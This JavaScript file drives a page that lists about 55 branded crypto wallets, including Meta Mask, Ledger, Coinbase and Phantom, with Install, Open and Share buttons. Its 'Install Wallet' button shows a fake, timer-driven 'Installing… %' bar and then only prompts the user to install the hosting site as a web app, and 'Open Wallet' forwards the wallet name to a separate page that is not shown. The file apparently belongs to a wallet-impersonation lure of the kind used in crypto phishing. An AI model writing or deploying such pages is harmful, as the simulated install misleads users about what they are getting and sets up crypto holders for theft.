console.log("Wallets page loaded!");

// Final clean wallet list
const wallets = [
  "Meta Mask","Poloniex","Trust","Solflare","WalletConnect","Terra","Bitpay","Maiar","MyKey",
  "Atwallet","Authereum","Bitfrost","Coinbase1","Coinomi","Dcent","Easypocket","Ledger",
  "Coolwallet","Cybavowallet","Coin98","Harmony","PeakDefi","Gridplus","VIA","Imtoken",
  "Infinito","Infinity","Kadachain","Keplr","Midas1","Marixwallet","Midas2","Nash","Onto",
  "Ownbit","Pillar","Rainbow","Safepal","Sollet","Spark","Spatium","Tokenary","Tokenpocket",
  "Tomo","Torus","Coinbase2","XDC","Walletio","Walleth","Zelcore","Phantom","Exodus","Binance",
  "Bitget","Other Wallets",
];

const container = document.getElementById("walletContainer");

// Generate wallet cards
wallets.forEach((name) => {
  let imageName =
    name.toLowerCase()
      .replace(/\s+/g, "")
      .replace(/'/g, "")
      .replace(/\./g, "")
      .replace(/-/g, "")
      .replace(/\//g, "") + ".webp";

  if (name.toLowerCase().includes("other")) {
    container.innerHTML += `
      <div class="wallet-card">
        <p>${name}</p>
        <div class="icon-row">
          <div class="icon-btn download-btn" onclick="installWallet('${name}')">
            <img src="assets/icons/downloads.png"><span>Install Wallet</span>
          </div>
          <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
            <img src="assets/icons/rocket.png"><span>Open Wallet</span>
          </div>
          <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
            <img src="assets/icons/share.png"><span>Share</span>
          </div>
        </div>
      </div>
    `;
    return;
  }

  container.innerHTML += `
    <div class="wallet-card">
      <img src="wallet-icons/${imageName}">
      <p>${name}</p>
      <div class="icon-row">
        <div class="icon-btn download-btn" onclick="installWallet('${name}')">
          <img src="assets/icons/downloads.png"><span>Install Wallet</span>
        </div>
        <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
          <img src="assets/icons/rocket.png"><span>Open Wallet</span>
        </div>
        <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
          <img src="assets/icons/share.png"><span>Share</span>
        </div>
      </div>
    </div>
  `;
});

function openWallet(walletName) {
  window.location.href = `wallet-page.html?wallet=${walletName}`;
}

// Share Wallet
function shareWallet(walletName) {
  if (navigator.share) {
    navigator.share({
      title: "Wallet",
      text: `Check this wallet: ${walletName}`,
      url: window.location.href,
    }).catch(() => {});
  } else {
    alert("Sharing not supported.");
  }
}

/* ===============================
   PWA INSTALL HANDLING
================================*/
let deferredPrompt = null;

window.addEventListener("beforeinstallprompt", (e) => {
  e.preventDefault();
  deferredPrompt = e;
});

/* ===============================
   PROGRESS POPUP (OLD POPUP)
================================*/
function closePopup() {
  document.getElementById("pwaPopup").style.display = "none";
}

/* ===============================
   NEW INSTALL POPUP
================================*/
function openInstallPopup() {
  document.getElementById("installPopup").style.display = "flex";
}

function closeInstallPopup() {
  document.getElementById("installPopup").style.display = "none";
}

// "Install Now" button inside NEW popup
document.getElementById("confirmInstallBtn").onclick = async () => {
  if (deferredPrompt) {
    deferredPrompt.prompt();
    await deferredPrompt.userChoice;
    deferredPrompt = null;
    closeInstallPopup();
  } else {
    alert("Install prompt not ready.");
  }
};

/* ===============================
   MAIN INSTALL BUTTON LOGIC
================================*/
function installWallet(walletName) {
  if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
    alert("Install only works on mobile.");
    return;
  }

  // Show progress popup
  let progress = 0;
  document.getElementById("pwaPopup").style.display = "flex";

  document.getElementById("progressText").innerText = "Installing… 0%";
  document.getElementById("progressFill").style.width = "0%";

  let interval = setInterval(() => {
    progress++;
    document.getElementById("progressText").innerText = `Installing… ${progress}%`;
    document.getElementById("progressFill").style.width = progress + "%";

    if (progress >= 100) {
      clearInterval(interval);

      // Complete
      document.getElementById("progressText").innerText = "Done!";
      document.getElementById("progressFill").style.width = "100%";

      setTimeout(() => {
        closePopup();       // close progress popup
        openInstallPopup(); // open NEW popup
      }, 700);
    }
  }, 40);
}
